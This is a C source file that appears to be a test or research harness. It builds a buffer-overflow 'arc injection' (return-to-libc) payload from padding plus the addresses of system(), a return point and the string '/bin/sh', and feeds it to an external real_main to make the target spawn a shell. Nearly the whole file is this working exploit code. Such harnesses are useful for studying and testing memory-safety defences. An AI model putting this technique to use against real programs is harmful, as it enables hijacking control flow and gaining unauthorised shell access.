
#include "stdio.h"
#include "stdlib.h"
#include "string.h"

#define DEBUG 1
#define FORMATBUFFERSIZE 2048

union
{
    unsigned long int integer;
    unsigned char byte[4];
} intUnion1, intUnion2, intUnion3;

union
{
    unsigned short int shortinteger;
    unsigned char byte[2];
} shortUnion;

extern int real_main(int argc, char **argv);

int main(int argc, char **argv) {

	char taintedbuf[8192] __attribute__ ((aligned (8)));
	int taintedbufWritePtr, taintedbufWriteCnt, diff;
	unsigned long int binshaddr, systemaddr, exitaddr;
	unsigned long int bufferaddr, retfptraddr;

	 /* Buffer Overflow - Arc Injection exploit */

	memset(taintedbuf,0,sizeof(taintedbuf));
	taintedbufWritePtr=0;
	taintedbufWriteCnt=0;

	sscanf(argv[1], "%lx", &systemaddr);
	sscanf(argv[2], "%lx", &retfptraddr);
	sscanf(argv[3], "%lx", &bufferaddr);
	//sscanf(argv[4], "%lx", &exitaddr);
	// set the environment variable
	char binsh[] = "/bin/sh";
	char tmp[20];
	sprintf(tmp, "%p", (void *) &binsh);
	sscanf(tmp, "%lx", &binshaddr);
	printf("binshaddr=0x%lx, systemaddr=0x%lx, retfptraddr=0x%lx, bufferaddr=0x%lx, exitaddr=0x%lx\n", binshaddr, systemaddr, retfptraddr, bufferaddr, exitaddr);

	int i;
	diff = retfptraddr - bufferaddr; // 4 bytes each for binshaddr, systemaddr and retfptraddr
	char padding[50000];
	// 100 characters of padding
	for(i = 0; i < diff; i++) {
		padding[i] = '-';
	}
	padding[i] = '\0';

	strcpy(taintedbuf, padding);
	taintedbufWritePtr = strlen(taintedbuf);
	char tb1[5], tb2[5], tb3[5];
	// function to arc-inject
	intUnion1.integer = systemaddr;
	tb1[3]=intUnion1.byte[3];
	tb1[2]=intUnion1.byte[2];
	tb1[1]=intUnion1.byte[1];
	tb1[0]=intUnion1.byte[0];
	tb1[4] = '\0';
	strcat(taintedbuf, tb1);

	// return to this function after our arc is over

	sprintf(tmp, "%p", (void *) &&gracefulExit);
	sscanf(tmp, "%lx", &exitaddr);

	intUnion2.integer = exitaddr;
	tb2[3]=intUnion2.byte[3];
	tb2[2]=intUnion2.byte[2];
	tb2[1]=intUnion2.byte[1];
	tb2[0]=intUnion2.byte[0];
	tb2[4] = '\0';
	strcat(taintedbuf, tb2);

	// argument to arc (system)
	intUnion3.integer = binshaddr;
	tb3[3]=intUnion3.byte[3];
	tb3[2]=intUnion3.byte[2];
	tb3[1]=intUnion3.byte[1];
	tb3[0]=intUnion3.byte[0];
	tb3[4] = '\0';
	strcat(taintedbuf, tb3);

	printf("%s\n", taintedbuf);

	strcpy(argv[1], "-a");
	strcpy(argv[2], taintedbuf);
	argc = 3;
	int ret = 0;
	ret = real_main(argc, argv);

	gracefulExit:
		printf("%s \n", "Died gracefully, return oriented programming!");
	return ret;
}

